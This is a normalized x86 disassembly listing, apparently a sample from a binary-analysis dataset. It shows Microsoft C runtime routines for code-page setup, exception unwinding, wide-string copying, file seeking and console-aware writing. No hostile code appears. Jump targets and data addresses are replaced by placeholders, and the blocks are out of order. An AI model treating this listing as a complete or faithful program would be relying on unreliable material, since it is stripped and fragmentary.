mov [ esi + eax + 0x11d ] bl
or [ esi + eax + 0x1d ] 0x20
mov cl [ ebp + eax - 0x304 ]
mov [ esi + eax + 0x11d ] cl
jmp r-xdata
movzx ecx al
movzx eax [ ebx ]
cmp ecx eax
ja r-xdata
movzx ecx [ ebp + eax * 2 - 0x504 ]
test cl 0x1
je r-xdata
jmp r-xdata
inc eax
cmp eax edi
jb r-xdata
sub_407b56
push 0xc
push r--data
call sub_405df0
call sub_4058db
mov edi eax
mov eax [ rw-data ]
test [ edi + 0x70 ] eax
je r-xdata
push 0xd
call sub_4052f1
pop ecx
and [ ebp - 0x4 ] 0x0
mov esi [ edi + 0x68 ]
mov [ ebp - 0x1c ] esi
cmp esi [ rw-data ]
je r-xdata
cmp [ edi + 0x6c ] 0x0
je r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
call sub_407bf1
jmp r-xdata
test esi esi
je r-xdata
mov esi [ edi + 0x68 ]
test esi esi
jne r-xdata
mov eax [ rw-data ]
mov [ edi + 0x68 ] eax
mov esi [ rw-data ]
mov [ ebp - 0x1c ] esi
push esi
call [ InterlockedIncrement@IAT ]
push esi
call [ InterlockedDecrement@IAT ]
test eax eax
jne r-xdata
mov eax esi
call sub_405e35
retn
push 0x20
call sub_4049f0
cmp esi rw-data
je r-xdata
push esi
call sub_404a59
pop ecx
sub_407bfa
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
push ebx
xor ebx ebx
push ebx
lea ecx [ ebp - 0x10 ]
call sub_40654c
mov [ rw-data ] ebx
cmp esi 0xfffffffe
jne r-xdata
cmp esi 0xfffffffd
jne r-xdata
mov [ rw-data ] 0x1
call [ GetOEMCP@IAT ]
cmp esi 0xfffffffc
jne r-xdata
mov [ rw-data ] 0x1
call [ GetACP@IAT ]
jmp r-xdata
pop ebx
leave
retn
mov ecx [ ebp - 0x8 ]
and [ ecx + 0x70 ] 0xfffffffd
jmp r-xdata
cmp [ ebp - 0x4 ] bl
je r-xdata
mov eax [ ebp - 0x10 ]
mov eax [ eax + 0x4 ]
mov [ rw-data ] 0x1
jmp r-xdata
cmp [ ebp - 0x4 ] bl
je r-xdata
mov eax esi
mov eax [ ebp - 0x8 ]
and [ eax + 0x70 ] 0xfffffffd
sub_407c76
mov edi edi
push ebp
mov ebp esp
sub esp 0x20
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push ebx
mov ebx [ ebp + 0xc ]
push esi
mov esi [ ebp + 0x8 ]
push edi
call sub_407bfa
mov edi eax
xor esi esi
mov [ ebp + 0x8 ] edi
cmp edi esi
jne r-xdata
mov [ ebp - 0x1c ] esi
xor eax eax
mov eax ebx
call sub_407962
push 0x101
lea eax [ ebx + 0x1c ]
push esi
push eax
call sub_407580
mov ecx [ ebp - 0x1c ]
add esp 0xc
imul ecx ecx 0x30
mov [ ebp - 0x20 ] esi
lea esi [ ecx + rw-data ]
mov [ ebp - 0x1c ] esi
jmp r-xdata
inc [ ebp - 0x1c ]
add eax 0x30
cmp eax 0xf0
jb r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_404645
leave
retn
cmp [ esi ] 0x0
jne r-xdata
cmp [ eax + rw-data ] edi
je r-xdata
cmp edi 0xfde8
je r-xdata
mov al [ esi + 0x1 ]
test al al
je r-xdata
mov esi [ ebp - 0x1c ]
inc [ ebp - 0x20 ]
add esi 0x8
cmp [ ebp - 0x20 ] 0x4
mov [ ebp - 0x1c ] esi
jb r-xdata
or eax 0xffffffff
cmp edi 0xfde9
je r-xdata
movzx edi [ esi ]
movzx eax al
jmp r-xdata
mov eax edi
mov [ ebx + 0x4 ] edi
mov [ ebx + 0x8 ] 0x1
call sub_407933
push 0x6
mov [ ebx + 0xc ] eax
lea eax [ ebx + 0x10 ]
lea ecx [ ecx + rw-data ]
pop edx
movzx eax di
push eax
call [ IsValidCodePage@IAT ]
test eax eax
je r-xdata
cmp edi eax
jbe r-xdata
mov si [ ecx ]
mov [ eax ] si
add ecx 0x2
add eax 0x2
dec edx
jne r-xdata
mov esi ebx
call sub_4079c6
jmp r-xdata
lea eax [ ebp - 0x18 ]
push eax
push edi
call [ GetCPInfo@IAT ]
test eax eax
je r-xdata
mov eax [ ebp - 0x20 ]
mov al [ eax + rw-data ]
or [ ebx + edi + 0x1d ] al
movzx eax [ esi + 0x1 ]
inc edi
mov edi [ ebp + 0x8 ]
add esi 0x2
xor eax eax
jmp r-xdata
cmp [ rw-data ] esi
jne r-xdata
push 0x101
lea eax [ ebx + 0x1c ]
push esi
push eax
call sub_407580
xor edx edx
inc edx
add esp 0xc
mov [ ebx + 0x4 ] edi
mov [ ebx + 0xc ] esi
cmp [ ebp - 0x18 ] edx
jbe r-xdata
mov [ ebx + 0x8 ] esi
cmp [ ebp - 0x12 ] 0x0
je r-xdata
lea eax [ ebx + 0x1e ]
mov ecx 0xfe
lea esi [ ebp - 0x11 ]
or [ eax ] 0x8
inc eax
dec ecx
jne r-xdata
mov eax [ ebx + 0x4 ]
call sub_407933
mov [ ebx + 0xc ] eax
mov [ ebx + 0x8 ] edx
jmp r-xdata
movzx eax [ esi - 0x1 ]
movzx ecx cl
jmp r-xdata
xor eax eax
movzx ecx ax
mov eax ecx
shl ecx 0x10
or eax ecx
lea edi [ ebx + 0x10 ]
stosd [ edi ]
stosd [ edi ]
stosd [ edi ]
jmp r-xdata
cmp eax ecx
jbe r-xdata
or [ ebx + eax + 0x1d ] 0x4
inc eax
add esi 0x2
cmp [ esi - 0x1 ] 0x0
jne r-xdata
mov cl [ esi ]
test cl cl
je r-xdata
sub_407e5f
push 0x14
push r--data
call sub_405df0
or [ ebp - 0x20 ] 0xffffffff
call sub_4058db
mov edi eax
mov [ ebp - 0x24 ] edi
call sub_407b56
mov ebx [ edi + 0x68 ]
mov esi [ ebp + 0x8 ]
call sub_407bfa
mov [ ebp + 0x8 ] eax
cmp eax [ ebx + 0x4 ]
je r-xdata
and [ ebp - 0x20 ] 0x0
push 0x220
call sub_4070db
pop ecx
mov ebx eax
test ebx ebx
je r-xdata
mov eax [ ebp - 0x20 ]
call sub_405e35
retn
mov ecx 0x88
mov esi [ edi + 0x68 ]
mov edi ebx
[ edi ] [ esi ]
and [ ebx ] 0x0
push ebx
push [ ebp + 0x8 ]
call sub_407c76
pop ecx
pop ecx
mov [ ebp - 0x20 ] eax
test eax eax
jne r-xdata
cmp eax 0xffffffff
jne r-xdata
mov esi [ ebp - 0x24 ]
push [ esi + 0x68 ]
call [ InterlockedDecrement@IAT ]
test eax eax
jne r-xdata
cmp ebx rw-data
je r-xdata
mov [ esi + 0x68 ] ebx
push ebx
mov edi [ InterlockedIncrement@IAT ]
call edi
test [ esi + 0x70 ] 0x2
jne r-xdata
mov eax [ esi + 0x68 ]
cmp eax rw-data
je r-xdata
call sub_405be1
mov [ eax ] 0x16
jmp r-xdata
push ebx
call sub_404a59
pop ecx
test [ rw-data ] 0x1
jne r-xdata
push eax
call sub_404a59
pop ecx
push 0xd
call sub_4052f1
pop ecx
and [ ebp - 0x4 ] 0x0
mov eax [ ebx + 0x4 ]
mov [ rw-data ] eax
mov eax [ ebx + 0x8 ]
mov [ rw-data ] eax
mov eax [ ebx + 0xc ]
mov [ rw-data ] eax
xor eax eax
xor eax eax
mov cx [ ebx + eax * 2 + 0x10 ]
mov [ eax * 2 + rw-data ] cx
inc eax
jmp r-xdata
xor eax eax
mov cl [ eax + ebx + 0x1c ]
mov [ eax + rw-data ] cl
inc eax
jmp r-xdata
mov [ ebp - 0x1c ] eax
cmp eax 0x5
jge r-xdata
push [ rw-data ]
call [ InterlockedDecrement@IAT ]
test eax eax
jne r-xdata
mov cl [ eax + ebx + 0x11d ]
mov [ eax + rw-data ] cl
inc eax
jmp r-xdata
mov [ ebp - 0x1c ] eax
cmp eax 0x101
jge r-xdata
mov [ rw-data ] ebx
push ebx
call edi
mov [ ebp - 0x4 ] 0xfffffffe
call sub_407fc0
jmp r-xdata
mov eax [ rw-data ]
cmp eax rw-data
je r-xdata
mov [ ebp - 0x1c ] eax
cmp eax 0x100
jge r-xdata
push eax
call sub_404a59
pop ecx
sub_408020
push ebx
push esi
push edi
mov edx [ esp + 0x10 ]
mov eax [ esp + 0x14 ]
mov ecx [ esp + 0x18 ]
push ebp
push edx
push eax
push ecx
push ecx
push sub_4080b0
push [ fs : 0x0 ]
mov eax [ rw-data ]
xor eax esp
mov [ esp + 0x8 ] eax
mov [ fs : 0x0 ] esp
pop [ fs : 0x0 ]
add esp 0x18
pop edi
pop esi
pop ebx
retn
mov edx [ esp + 0x34 ]
cmp edx 0xfffffffe
je r-xdata
lea esi [ esi + esi * 2 ]
lea ebx [ ebx + esi * 4 + 0x10 ]
mov ecx [ ebx ]
mov [ eax + 0xc ] ecx
cmp [ ebx + 0x4 ] 0x0
jne r-xdata
cmp esi edx
jbe r-xdata
mov eax [ esp + 0x30 ]
mov ebx [ eax + 0x8 ]
mov ecx [ esp + 0x2c ]
xor ebx [ ecx ]
mov esi [ eax + 0xc ]
cmp esi 0xfffffffe
je r-xdata
push 0x101
mov eax [ ebx + 0x8 ]
call sub_40ad05
mov ecx 0x1
mov eax [ ebx + 0x8 ]
call sub_40ad24
jmp r-xdata
sub_4080b0
mov ecx [ esp + 0x4 ]
test [ ecx + 0x4 ] 0x6
mov eax 0x1
je r-xdata
retn
mov eax [ esp + 0x8 ]
mov ecx [ eax + 0x8 ]
xor ecx eax
call sub_404645
push ebp
mov ebp [ eax + 0x18 ]
push [ eax + 0xc ]
push [ eax + 0x10 ]
push [ eax + 0x14 ]
call sub_408020
add esp 0xc
pop ebp
mov eax [ esp + 0x8 ]
mov edx [ esp + 0x10 ]
mov [ edx ] eax
mov eax 0x3
sub_408112
push ebp
push esi
push edi
push ebx
mov ebp edx
xor eax eax
xor ebx ebx
xor edx edx
xor esi esi
xor edi edi
call ecx
pop ebx
pop edi
pop esi
pop ebp
retn
sub_408142
push ebp
mov ebp esp
push ebx
push esi
push edi
push 0x0
push edx
push r-xdata
push ecx
call RtlUnwind
pop edi
pop esi
pop ebx
pop ebp
retn
sub_408172
mov edi edi
push ebp
mov ebp esp
sub esp 0x24
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x8 ]
push ebx
mov [ ebp - 0x20 ] eax
mov eax [ ebp + 0xc ]
push esi
push edi
mov [ ebp - 0x1c ] eax
call sub_40572b
and [ ebp - 0x14 ] 0x0
cmp [ rw-data ] 0x0
mov [ ebp - 0x18 ] eax
jne r-xdata
mov eax [ rw-data ]
mov ecx [ ebp - 0x18 ]
mov esi [ DecodePointer@IAT ]
cmp eax ecx
je r-xdata
push r--data
call [ LoadLibraryW@IAT ]
mov ebx eax
test ebx ebx
je r-xdata
mov eax [ rw-data ]
cmp eax [ ebp - 0x18 ]
je r-xdata
cmp [ rw-data ] ecx
je r-xdata
xor eax eax
mov edi [ GetProcAddress@IAT ]
push r--data
push ebx
call edi
test eax eax
je r-xdata
push [ rw-data ]
call esi
test eax eax
je r-xdata
push eax
call esi
test eax eax
je r-xdata
push eax
call esi
push [ rw-data ]
mov edi eax
call esi
mov ebx eax
test edi edi
je r-xdata
mov esi [ EncodePointer@IAT ]
push eax
call esi
push r--data
push ebx
mov [ rw-data ] eax
call edi
push eax
call esi
push r--data
push ebx
mov [ rw-data ] eax
call edi
push eax
call esi
push r--data
push ebx
mov [ rw-data ] eax
call edi
push eax
call esi
mov [ rw-data ] eax
test eax eax
je r-xdata
push [ ebp + 0x10 ]
push [ ebp - 0x1c ]
push [ ebp - 0x20 ]
push [ ebp - 0x14 ]
call eax
jmp r-xdata
call eax
mov [ ebp - 0x14 ] eax
test eax eax
je r-xdata
test ebx ebx
je r-xdata
push r--data
push ebx
call edi
push eax
call esi
mov [ rw-data ] eax
mov ecx [ ebp - 0x4 ]
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_404645
leave
retn
mov eax [ rw-data ]
cmp eax [ ebp - 0x18 ]
je r-xdata
call edi
test eax eax
je r-xdata
push eax
call esi
test eax eax
je r-xdata
or [ ebp + 0x10 ] 0x200000
jmp r-xdata
lea ecx [ ebp - 0x24 ]
push ecx
push 0xc
lea ecx [ ebp - 0x10 ]
push ecx
push 0x1
push eax
call ebx
test eax eax
je r-xdata
push [ ebp - 0x14 ]
call eax
mov [ ebp - 0x14 ] eax
test [ ebp - 0x8 ] 0x1
jne r-xdata
sub_4082de
mov edi edi
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
push edi
test esi esi
je r-xdata
call sub_405be1
push 0x16
pop esi
mov [ eax ] esi
mov edi [ ebp + 0xc ]
test edi edi
jne r-xdata
mov ecx [ ebp + 0x10 ]
test ecx ecx
jne r-xdata
mov edx esi
xor eax eax
mov [ esi ] ax
jmp r-xdata
test edi edi
je r-xdata
add edx 0x2
dec edi
jne r-xdata
sub edx ecx
cmp [ edx ] 0x0
je r-xdata
xor eax eax
test edi edi
jne r-xdata
dec edi
jne r-xdata
pop edi
pop esi
pop ebp
retn
mov [ esi ] ax
call sub_405be1
push 0x22
pop ecx
mov [ eax ] ecx
mov esi ecx
jmp r-xdata
movzx eax [ ecx ]
mov [ edx + ecx ] ax
add ecx 0x2
test ax ax
je r-xdata
call sub_40571b
mov eax esi
sub_408353
mov edi edi
push ebp
mov ebp esp
mov edx [ ebp + 0x8 ]
push ebx
mov ebx [ ebp + 0x14 ]
push esi
push edi
test ebx ebx
jne r-xdata
test edx edx
je r-xdata
test edx edx
jne r-xdata
call sub_405be1
push 0x16
pop esi
mov [ eax ] esi
mov edi [ ebp + 0xc ]
test edi edi
jne r-xdata
cmp [ ebp + 0xc ] edx
jne r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
test ebx ebx
jne r-xdata
xor eax eax
mov ecx [ ebp + 0x10 ]
test ecx ecx
jne r-xdata
xor eax eax
mov [ edx ] ax
jmp r-xdata
mov eax edx
cmp ebx 0xffffffff
jne r-xdata
xor eax eax
mov [ edx ] ax
jmp r-xdata
mov esi ecx
sub esi edx
mov esi edx
sub esi ecx
test ebx ebx
jne r-xdata
dec edi
je r-xdata
test edi edi
jne r-xdata
dec edi
jne r-xdata
xor ecx ecx
mov [ eax ] cx
dec ebx
jne r-xdata
xor eax eax
cmp ebx 0xffffffff
jne r-xdata
movzx eax [ ecx ]
mov [ esi + ecx ] ax
add ecx 0x2
test ax ax
je r-xdata
jmp r-xdata
movzx ecx [ esi + eax ]
mov [ eax ] cx
add eax 0x2
test cx cx
je r-xdata
mov [ edx ] ax
call sub_405be1
push 0x22
pop ecx
mov [ eax ] ecx
mov esi ecx
jmp r-xdata
mov ecx [ ebp + 0xc ]
push 0x50
mov [ edx + ecx * 2 - 0x2 ] ax
pop eax
jmp r-xdata
call sub_40571b
mov eax esi
jmp r-xdata
sub_408420
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov cx [ eax ]
add eax 0x2
test cx cx
jne r-xdata
sub eax [ ebp + 0x8 ]
sar eax 0x1
dec eax
pop ebp
retn
sub_40843b
mov edi edi
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
push edi
test esi esi
je r-xdata
call sub_405be1
push 0x16
pop esi
mov [ eax ] esi
mov edi [ ebp + 0xc ]
test edi edi
jne r-xdata
mov eax [ ebp + 0x10 ]
test eax eax
jne r-xdata
mov edx esi
sub edx eax
mov [ esi ] ax
jmp r-xdata
xor eax eax
test edi edi
jne r-xdata
dec edi
jne r-xdata
pop edi
pop esi
pop ebp
retn
mov [ esi ] ax
call sub_405be1
push 0x22
pop ecx
mov [ eax ] ecx
mov esi ecx
jmp r-xdata
movzx ecx [ eax ]
mov [ edx + eax ] cx
add eax 0x2
test cx cx
je r-xdata
call sub_40571b
mov eax esi
sub_40849e
mov edi edi
push ebp
mov ebp esp
mov ecx [ ebp + 0x8 ]
test ecx ecx
js r-xdata
call sub_405be1
mov [ eax ] 0x16
call sub_40571b
or eax 0xffffffff
pop ebp
retn
cmp ecx 0x2
jle r-xdata
mov eax [ rw-data ]
mov [ rw-data ] ecx
pop ebp
retn
cmp ecx 0x3
jne r-xdata
mov eax [ rw-data ]
pop ebp
retn
sub_4084dd
mov edi edi
push ebp
mov ebp esp
push ecx
push ecx
mov eax [ ebp + 0xc ]
push esi
mov esi [ ebp + 0x8 ]
mov [ ebp - 0x8 ] eax
mov eax [ ebp + 0x10 ]
push edi
push esi
mov [ ebp - 0x4 ] eax
call sub_40adad
or edi 0xffffffff
pop ecx
cmp eax edi
jne r-xdata
push [ ebp + 0x14 ]
lea ecx [ ebp - 0x4 ]
push ecx
push [ ebp - 0x8 ]
push eax
call [ SetFilePointer@IAT ]
mov [ ebp - 0x8 ] eax
cmp eax edi
jne r-xdata
call sub_405be1
mov [ eax ] 0x9
mov eax esi
sar eax 0x5
mov eax [ eax * 4 + rw-data ]
and esi 0x1f
shl esi 0x6
lea eax [ eax + esi + 0x4 ]
and [ eax ] 0xfd
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
call [ GetLastError@IAT ]
test eax eax
je r-xdata
pop edi
pop esi
leave
retn
push eax
call sub_405c07
pop ecx
jmp r-xdata
mov eax edi
mov edx edi
jmp r-xdata
sub_408562
push 0x14
push r--data
call sub_405df0
or ebx 0xffffffff
mov [ ebp - 0x24 ] ebx
mov [ ebp - 0x20 ] ebx
mov eax [ ebp + 0x8 ]
cmp eax 0xfffffffe
jne r-xdata
test eax eax
js r-xdata
call sub_405bf4
and [ eax ] 0x0
call sub_405be1
mov [ eax ] 0x9
call sub_405bf4
and [ eax ] 0x0
call sub_405be1
mov [ eax ] 0x9
call sub_40571b
jmp r-xdata
cmp eax [ rw-data ]
jb r-xdata
call sub_405e35
retn
mov eax ebx
mov edx ebx
jmp r-xdata
mov ecx eax
sar ecx 0x5
lea edi [ ecx * 4 + rw-data ]
mov esi eax
and esi 0x1f
shl esi 0x6
mov ecx [ edi ]
movsx ecx [ ecx + esi + 0x4 ]
and ecx 0x1
je r-xdata
push eax
call sub_40ae16
pop ecx
and [ ebp - 0x4 ] 0x0
mov eax [ edi ]
test [ eax + esi + 0x4 ] 0x1
je r-xdata
call sub_405be1
mov [ eax ] 0x9
call sub_405bf4
and [ eax ] 0x0
mov [ ebp - 0x24 ] ebx
mov [ ebp - 0x20 ] ebx
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_4084dd
add esp 0x10
mov [ ebp - 0x24 ] eax
mov [ ebp - 0x20 ] edx
jmp r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
call sub_408642
mov eax [ ebp - 0x24 ]
mov edx [ ebp - 0x20 ]
sub_40864c
mov edi edi
push ebp
mov ebp esp
mov eax 0x1ae4
call sub_40af20
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0xc ]
push esi
mov esi [ ebp + 0x8 ]
push edi
xor edi edi
mov [ ebp - 0x1acc ] eax
mov [ ebp - 0x1ac8 ] edi
mov [ ebp - 0x1ad0 ] edi
cmp [ ebp + 0x10 ] edi
jne r-xdata
cmp eax edi
jne r-xdata
xor eax eax
jmp r-xdata
mov eax esi
sar eax 0x5
mov edi esi
push ebx
lea ebx [ eax * 4 + rw-data ]
mov eax [ ebx ]
and edi 0x1f
shl edi 0x6
mov cl [ eax + edi + 0x24 ]
add cl cl
sar cl 0x1
mov [ ebp - 0x1adc ] ebx
mov [ ebp - 0x1ac1 ] cl
cmp cl 0x2
je r-xdata
call sub_405bf4
mov [ eax ] edi
call sub_405be1
mov [ eax ] 0x16
call sub_40571b
or eax 0xffffffff
jmp r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
xor ecx ebp
pop esi
call sub_404645
leave
retn
mov ecx [ ebp + 0x10 ]
not ecx
test cl 0x1
jne r-xdata
cmp cl 0x1
jne r-xdata
test [ eax + edi + 0x4 ] 0x20
je r-xdata
call sub_405bf4
and [ eax ] 0x0
call sub_405be1
mov [ eax ] 0x16
call sub_40571b
jmp r-xdata
push esi
call sub_408e66
pop ecx
test eax eax
je r-xdata
push 0x2
push 0x0
push 0x0
push esi
call sub_4084dd
add esp 0x10
or eax 0xffffffff
jmp r-xdata
xor ecx ecx
mov eax [ ebx ]
test [ edi + eax + 0x4 ] 0x80
je r-xdata
pop ebx
push ecx
lea ecx [ ebp - 0x1ad8 ]
push ecx
push [ ebp + 0x10 ]
push [ ebp - 0x1acc ]
push [ eax + edi ]
call [ WriteFile@IAT ]
test eax eax
je r-xdata
cmp [ ebp - 0x1ac1 ] 0x0
mov [ ebp - 0x1abc ] ecx
jne r-xdata
call sub_4058db
mov eax [ eax + 0x6c ]
xor ecx ecx
cmp [ eax + 0x14 ] ecx
lea eax [ ebp - 0x1ae0 ]
sete cl
push eax
mov eax [ ebx ]
push [ edi + eax ]
mov esi ecx
call [ GetConsoleMode@IAT ]
xor ecx ecx
cmp eax ecx
je r-xdata
call [ GetLastError@IAT ]
mov [ ebp - 0x1abc ] eax
mov eax [ ebp - 0x1ad8 ]
and [ ebp - 0x1abc ] 0x0
mov [ ebp - 0x1ac8 ] eax
jmp r-xdata
cmp [ ebp - 0x1ac1 ] 0x2
jne r-xdata
mov ebx [ ebp - 0x1acc ]
cmp [ ebp + 0x10 ] ecx
jbe r-xdata
mov eax [ ebx ]
test [ eax + edi + 0x4 ] 0x80
je r-xdata
cmp esi ecx
je r-xdata
mov eax [ ebp - 0x1ac8 ]
sub eax [ ebp - 0x1ad0 ]
cmp [ ebp - 0x1abc ] 0x0
je r-xdata
cmp [ ebp - 0x1ac8 ] 0x0
jne r-xdata
mov eax [ ebp - 0x1acc ]
mov [ ebp - 0x1ad4 ] eax
cmp [ ebp + 0x10 ] ecx
jbe r-xdata
mov ebx [ ebp - 0x1acc ]
cmp [ ebp + 0x10 ] ecx
jbe r-xdata
mov eax [ ebp - 0x1adc ]
mov eax [ eax ]
test [ edi + eax + 0x4 ] 0x40
je r-xdata
mov ecx ebx
xor esi esi
sub ecx [ ebp - 0x1acc ]
lea eax [ ebp - 0x1ab8 ]
call [ GetConsoleCP@IAT ]
mov ebx [ ebp - 0x1acc ]
mov [ ebp - 0x1ae0 ] eax
xor eax eax
mov [ ebp - 0x1ad4 ] eax
cmp [ ebp + 0x10 ] eax
jbe r-xdata
cmp [ ebp - 0x1ac1 ] cl
je r-xdata
push 0x5
pop esi
cmp [ ebp - 0x1abc ] esi
jne r-xdata
mov ecx [ ebp - 0x1ad4 ]
and [ ebp - 0x1ac0 ] 0x0
sub ecx [ ebp - 0x1acc ]
push 0x2
lea eax [ ebp - 0x6b8 ]
pop esi
and [ ebp - 0x1ac0 ] 0x0
mov ecx ebx
sub ecx [ ebp - 0x1acc ]
push 0x2
lea eax [ ebp - 0x1ab8 ]
pop esi
call sub_405be1
mov [ eax ] 0x1c
call sub_405bf4
and [ eax ] 0x0
mov eax [ ebp - 0x1acc ]
cmp [ eax ] 0x1a
jne r-xdata
mov esi eax
lea eax [ ebp - 0x1ab8 ]
sub esi eax
push 0x0
lea eax [ ebp - 0x1ad8 ]
push eax
push esi
lea eax [ ebp - 0x1ab8 ]
push eax
mov eax [ ebp - 0x1adc ]
mov eax [ eax ]
push [ edi + eax ]
call [ WriteFile@IAT ]
test eax eax
je r-xdata
mov dl [ ebx ]
inc ebx
inc ecx
mov [ ebp - 0x1ae0 ] ebx
cmp dl 0xa
jne r-xdata
mov [ ebp - 0x1ac0 ] eax
push [ ebp - 0x1abc ]
call sub_405c07
pop ecx
jmp r-xdata
call sub_405be1
mov [ eax ] 0x9
call sub_405bf4
mov [ eax ] esi
jmp r-xdata
xor esi esi
push esi
push esi
push 0xd55
lea ecx [ ebp - 0x1410 ]
push ecx
lea ecx [ ebp - 0x6b8 ]
sub eax ecx
cdq
sub eax edx
sar eax 0x1
push eax
mov eax ecx
push eax
push esi
push 0xfde9
call [ WideCharToMultiByte@IAT ]
mov ebx eax
cmp ebx esi
je r-xdata
mov edx [ ebp - 0x1ad4 ]
movzx edx [ edx ]
add [ ebp - 0x1ad4 ] esi
add ecx esi
cmp edx 0xa
jne r-xdata
mov esi eax
lea eax [ ebp - 0x1ab8 ]
sub esi eax
push 0x0
lea eax [ ebp - 0x1ad8 ]
push eax
push esi
lea eax [ ebp - 0x1ab8 ]
push eax
mov eax [ ebp - 0x1adc ]
mov eax [ eax ]
push [ edi + eax ]
call [ WriteFile@IAT ]
test eax eax
je r-xdata
movzx edx [ ebx ]
add ebx esi
add ecx esi
mov [ ebp - 0x1ae0 ] ebx
cmp edx 0xa
jne r-xdata
xor eax eax
jmp r-xdata
mov eax [ ebp - 0x1ad8 ]
add [ ebp - 0x1ac8 ] eax
cmp eax esi
jl r-xdata
mov [ eax ] dl
inc eax
inc esi
cmp esi 0x13ff
jb r-xdata
inc [ ebp - 0x1ad0 ]
mov [ eax ] 0xd
inc eax
inc esi
cmp al 0x1
je r-xdata
mov cl [ ebx ]
mov esi [ ebp - 0x1adc ]
xor eax eax
cmp cl 0xa
sete al
mov [ ebp - 0x1ae4 ] eax
mov eax [ esi ]
add eax edi
cmp [ eax + 0x38 ] 0x0
je r-xdata
push 0x0
lea eax [ ebp - 0x1ad8 ]
push eax
mov eax ebx
sub eax esi
push eax
lea eax [ ebp + esi - 0x1410 ]
push eax
mov eax [ ebp - 0x1adc ]
mov eax [ eax ]
push [ edi + eax ]
call [ WriteFile@IAT ]
test eax eax
je r-xdata
add [ ebp - 0x1ac0 ] esi
mov [ eax ] dx
add eax esi
cmp [ ebp - 0x1ac0 ] 0x6a8
jb r-xdata
push 0xd
pop ebx
mov [ eax ] bx
add eax esi
add [ ebp - 0x1ac0 ] esi
mov eax [ ebp - 0x1ad8 ]
add [ ebp - 0x1ac8 ] eax
cmp eax esi
jl r-xdata
add [ ebp - 0x1ac0 ] esi
mov [ eax ] dx
add eax esi
cmp [ ebp - 0x1ac0 ] 0x13fe
jb r-xdata
add [ ebp - 0x1ad0 ] esi
push 0xd
pop ebx
mov [ eax ] bx
mov ebx [ ebp - 0x1ae0 ]
add eax esi
add [ ebp - 0x1ac0 ] esi
mov eax ebx
sub eax [ ebp - 0x1acc ]
cmp eax [ ebp + 0x10 ]
jb r-xdata
cmp ecx [ ebp + 0x10 ]
jae r-xdata
movzx esi [ ebx ]
xor ecx ecx
cmp esi 0xa
sete cl
add ebx 0x2
add [ ebp - 0x1ac0 ] 0x2
mov [ ebp - 0x1abc ] esi
mov [ ebp - 0x1ae4 ] ecx
cmp al 0x2
jne r-xdata
movsx eax cl
push eax
call sub_40939c
pop ecx
test eax eax
je r-xdata
mov dl [ eax + 0x34 ]
mov [ ebp - 0xc ] dl
mov [ ebp - 0xb ] cl
and [ eax + 0x38 ] 0x0
push 0x2
lea eax [ ebp - 0xc ]
push eax
jmp r-xdata
call [ GetLastError@IAT ]
mov [ ebp - 0x1abc ] eax
add esi [ ebp - 0x1ad8 ]
cmp ebx esi
jg r-xdata
cmp ecx [ ebp + 0x10 ]
jae r-xdata
mov eax ebx
sub eax [ ebp - 0x1acc ]
cmp eax [ ebp + 0x10 ]
jb r-xdata
cmp ecx [ ebp + 0x10 ]
jae r-xdata
jmp r-xdata
push [ ebp - 0x1abc ]
call sub_40aedc
pop ecx
cmp ax [ ebp - 0x1abc ]
jne r-xdata
cmp al 0x2
jne r-xdata
cmp al 0x1
je r-xdata
push 0x1
push ebx
mov ecx [ ebp - 0x1acc ]
sub ecx ebx
add ecx [ ebp + 0x10 ]
xor eax eax
inc eax
cmp ecx eax
jbe r-xdata
lea eax [ ebp - 0x1abc ]
push eax
call sub_40934a
add esp 0xc
cmp eax 0xffffffff
je r-xdata
mov eax [ ebp - 0x1ad4 ]
sub eax [ ebp - 0x1acc ]
mov [ ebp - 0x1ac8 ] eax
cmp eax [ ebp + 0x10 ]
jb r-xdata
jmp r-xdata
jmp r-xdata
add [ ebp - 0x1ac8 ] 0x2
cmp [ ebp - 0x1ae4 ] 0x0
je r-xdata
mov eax [ ebp + 0x10 ]
cmp [ ebp - 0x1ac0 ] eax
jb r-xdata
xor eax eax
push eax
push eax
push 0x5
lea ecx [ ebp - 0xc ]
push ecx
push 0x1
lea ecx [ ebp - 0x1abc ]
push ecx
push eax
push [ ebp - 0x1ae0 ]
inc ebx
inc [ ebp - 0x1ac0 ]
call [ WideCharToMultiByte@IAT ]
mov esi eax
test esi esi
je r-xdata
mov ecx [ esi ]
mov dl [ ebx ]
inc [ ebp - 0x1ac8 ]
mov [ edi + ecx + 0x34 ] dl
mov ecx [ esi ]
mov [ edi + ecx + 0x38 ] eax
jmp r-xdata
push 0x2
lea eax [ ebp - 0x1abc ]
push ebx
push eax
call sub_40934a
add esp 0xc
cmp eax 0xffffffff
je r-xdata
jmp r-xdata
cmp ebx esi
jg r-xdata
push 0xd
pop eax
push eax
mov [ ebp - 0x1abc ] eax
call sub_40aedc
pop ecx
cmp ax [ ebp - 0x1abc ]
jne r-xdata
mov al [ ebp - 0x1ac1 ]
test al al
jne r-xdata
jmp r-xdata
push 0x0
lea eax [ ebp - 0x1ad4 ]
push eax
push esi
lea eax [ ebp - 0xc ]
push eax
mov eax [ ebp - 0x1adc ]
mov eax [ eax ]
push [ edi + eax ]
call [ WriteFile@IAT ]
test eax eax
je r-xdata
inc ebx
inc [ ebp - 0x1ac0 ]
jmp r-xdata
inc [ ebp - 0x1ac8 ]
inc [ ebp - 0x1ad0 ]
mov eax [ ebp - 0x1ac0 ]
mov ecx [ ebp - 0x1ad0 ]
add eax ecx
mov [ ebp - 0x1ac8 ] eax
cmp [ ebp - 0x1ad4 ] esi
jl r-xdata
